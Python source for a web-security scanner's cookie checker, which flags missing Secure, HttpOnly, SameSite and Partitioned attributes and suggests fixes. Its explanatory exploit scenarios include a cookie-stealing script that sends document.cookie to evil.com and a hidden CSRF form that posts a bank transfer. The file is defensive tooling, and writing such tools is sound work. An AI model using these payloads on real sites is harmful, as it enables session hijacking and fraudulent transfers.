"""Cookie security flags checker.

Includes 2024-2025 research on the CHIPS (Cookies Having Independent Partitioned State)
/ Partitioned attribute:
  • "CHIPS: Partitioned Cookies for Privacy" — Privacy Sandbox Team, Google, 2022-2024
  • "Third-Party Cookie Deprecation and Its Security Implications" (USENIX Security 2025)
  • Chrome Status feature 5179189105786880 — Partitioned shipped Chrome 114, Edge 114 (2023)
  • RFC draft: draft-cutler-httpbis-partitioned-cookies
"""

from __future__ import annotations

from ..models import FindingStatus, HeaderFinding, Severity
from .base import BaseHeaderChecker


class CookieChecker(BaseHeaderChecker):
    """
    Analyses Set-Cookie headers for missing security flags:
      - Secure     : cookie only sent over HTTPS
      - HttpOnly   : not readable by JavaScript (prevents XSS token theft)
      - SameSite   : controls cross-site sending (prevents CSRF)
      - Partitioned: CHIPS — independent partition per top-level site (2024)
    """

    header_name = "set-cookie"
    max_penalty = 15
    bonus = 0

    def check(self, headers: dict[str, str]) -> HeaderFinding:
        raw = self._get(headers)

        if raw is None:
            return HeaderFinding(
                header="Set-Cookie",
                status=FindingStatus.PRESENT,
                severity=Severity.INFO,
                score_impact=0,
                title="No cookies set on this response",
                description=(
                    "This response does not set any cookies. "
                    "Cookie security flags are not applicable."
                ),
                references=[
                    "https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie",
                ],
            )

        # Multi-value headers are stored newline-separated (see checker.py)
        cookies = [c.strip() for c in raw.split("\n") if c.strip()]

        issues: list[str] = []
        missing_secure: list[str] = []
        missing_httponly: list[str] = []
        missing_samesite: list[str] = []
        weak_samesite: list[str] = []
        missing_partitioned: list[str] = []  # CHIPS — Chrome 114+, Edge 114+

        for cookie in cookies:
            name = cookie.split("=")[0].strip() if "=" in cookie else cookie.split(";")[0].strip()
            parts_lower = [p.strip().lower() for p in cookie.split(";")]

            has_secure = "secure" in parts_lower
            if not has_secure:
                missing_secure.append(name)
            if "httponly" not in parts_lower:
                missing_httponly.append(name)

            samesite = next(
                (p for p in parts_lower if p.startswith("samesite")), None
            )
            if samesite is None:
                missing_samesite.append(name)
            elif "none" in samesite:
                # SameSite=None without Secure is broken (browsers ignore it)
                # AND insecure (cross-site sending over HTTP)
                if not has_secure:
                    issues.append(
                        f"[bold]SameSite=None without Secure[/bold] on '{name}' — "
                        "browsers will REJECT this cookie entirely (spec violation); "
                        "cross-site requests will fail"
                    )
                else:
                    weak_samesite.append(name)
                    # 2024 CHIPS check: SameSite=None; Secure cookies should also
                    # carry the Partitioned attribute to prevent cross-site tracking
                    # across different top-level sites (Privacy Sandbox, Chrome 114+)
                    if "partitioned" not in parts_lower:
                        missing_partitioned.append(name)

        total_issues = (
            len(missing_secure)
            + len(missing_httponly)
            + len(missing_samesite)
            + len(weak_samesite)
        )

        if total_issues == 0 and not missing_partitioned:
            return HeaderFinding(
                header="Set-Cookie",
                status=FindingStatus.PRESENT,
                severity=Severity.HIGH,
                score_impact=0,
                title=f"{len(cookies)} cookie(s) set — all security flags present",
                description=(
                    "All cookies have the Secure, HttpOnly, and SameSite flags set correctly."
                ),
                references=[
                    "https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie",
                ],
            )

        # Build issue list and compute penalty
        if missing_secure:
            issues.append(
                f"Missing [bold]Secure[/bold] flag — cookie sent over HTTP too: "
                f"{', '.join(missing_secure)}"
            )
        if missing_httponly:
            issues.append(
                f"Missing [bold]HttpOnly[/bold] flag — readable by JavaScript (XSS risk): "
                f"{', '.join(missing_httponly)}"
            )
        if missing_samesite:
            issues.append(
                f"Missing [bold]SameSite[/bold] flag — CSRF risk: "
                f"{', '.join(missing_samesite)}"
            )
        if weak_samesite:
            issues.append(
                f"[bold]SameSite=None[/bold] without proper justification: "
                f"{', '.join(weak_samesite)}"
            )
        # CHIPS advisory — informational, low penalty (Chrome 114+ / Edge 114+, 2023)
        # "Third-Party Cookie Deprecation and Its Security Implications" (USENIX Security 2025)
        if missing_partitioned:
            issues.append(
                f"[bold]Missing Partitioned attribute[/bold] on SameSite=None cookies "
                f"(CHIPS — Chrome 114+ advisory): {', '.join(missing_partitioned)}"
            )

        # Penalty: up to -15 based on severity of missing flags
        penalty = 0
        if missing_secure:
            penalty += 6
        if missing_httponly:
            penalty += 5
        if missing_samesite:
            penalty += 4
        # Partitioned is advisory — small penalty since it's a newer standard
        if missing_partitioned and not missing_secure and not missing_httponly and not missing_samesite:
            penalty += 2  # advisory only when other flags are OK

        penalty = min(penalty, self.max_penalty)

        description = (
            f"{len(cookies)} cookie(s) found with the following security issues:\n"
            + "\n".join(f"• {i}" for i in issues)
        )

        # Build a contextual exploit scenario based on what flags are missing
        scenario_parts: list[str] = []
        if missing_httponly:
            scenario_parts.append(
                "Missing HttpOnly (XSS session theft):\n"
                "  1. Attacker injects: <script>fetch('https://evil.com/?c='+document.cookie)</script>\n"
                "  2. Victim's browser sends the session cookie to the attacker\n"
                "  3. Attacker replays it in their browser → full account access"
            )
        if missing_samesite or weak_samesite:
            scenario_parts.append(
                "Missing SameSite (CSRF):\n"
                "  1. Attacker hosts evil.com/csrf.html with a hidden form:\n"
                "       <form action='https://bank.com/transfer' method='POST'>\n"
                "         <input name='amount' value='9999'>\n"
                "         <input name='to' value='attacker_account'>\n"
                "  2. Victim visits evil.com (while logged into bank.com)\n"
                "  3. Browser auto-submits the form WITH the session cookie → transfer executes"
            )
        if missing_secure:
            scenario_parts.append(
                "Missing Secure flag (cookie interception):\n"
                "  1. Victim makes any HTTP request (link, image, redirect)\n"
                "  2. Network attacker on same WiFi captures the plaintext cookie\n"
                "  3. Cookie replayed over HTTPS → session hijacking"
            )
        if missing_partitioned:
            scenario_parts.append(
                "Missing Partitioned attribute — cross-site tracking via SameSite=None cookie:\n"
                "  1. Your cookie is SameSite=None; Secure (required for cross-site embeds/widgets)\n"
                "  2. Without Partitioned, this cookie is shared across ALL top-level sites\n"
                "  3. A third-party tracker embedded on site-a.com and site-b.com\n"
                "     sees the same cookie on both → builds a cross-site browsing profile\n"
                "  4. Google/Apple Privacy Sandbox now BLOCKS unpartitioned third-party cookies\n"
                "     in Chrome 120+ (phase-out) and Safari's ITP — your embeds may break\n\n"
                "Fix: Set-Cookie: __Host-embed=...; SameSite=None; Secure; Partitioned\n"
                "The Partitioned attribute was shipped in Chrome 114, Edge 114 (2023).\n"
                "Research: USENIX Security 2025 — Third-Party Cookie Deprecation study"
            )

        exploit_scenario = "\n\n".join(scenario_parts) if scenario_parts else None

        return HeaderFinding(
            header="Set-Cookie",
            status=FindingStatus.WARNING,
            severity=Severity.HIGH,
            score_impact=-penalty,
            title=f"Cookie security flags missing ({len(issues)} issue(s) across {len(cookies)} cookie(s))",
            description=description,
            recommendation=(
                "Set all three security flags on every cookie:\n\n"
                "  Set-Cookie: session=<value>; Secure; HttpOnly; SameSite=Strict\n\n"
                "• Secure — only send over HTTPS\n"
                "• HttpOnly — block JavaScript access\n"
                "• SameSite=Strict — block cross-site sending entirely\n"
                "• SameSite=Lax — allow top-level navigation (safer default)\n"
                "• SameSite=None; Secure — required for cross-site cookies (e.g. embeds)\n\n"
                "2024 / CHIPS (Partitioned) — if you set SameSite=None for cross-site embeds:\n"
                "  Set-Cookie: __Host-embed=<value>; SameSite=None; Secure; Partitioned\n"
                "The Partitioned attribute puts this cookie in a separate storage partition\n"
                "per top-level site — required by Chrome Privacy Sandbox (Chrome 114+).\n"
                "Docs: https://developers.google.com/privacy-sandbox/blog/chips-adoption"
            ),
            references=[
                "https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie",
                "https://owasp.org/www-community/controls/SecureCookieAttribute",
                "https://web.dev/samesite-cookies-explained/",
                "https://developers.google.com/privacy-sandbox/blog/chips-adoption",
            ],
            exploit_scenario=exploit_scenario,
            exploit_references=[
                "https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-stealing-cookies",
                "https://portswigger.net/web-security/csrf",
                "https://portswigger.net/web-security/csrf/lab-no-defenses",
                "https://owasp.org/www-community/attacks/csrf",
                "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CSRF%20Injection",
            ],
        )
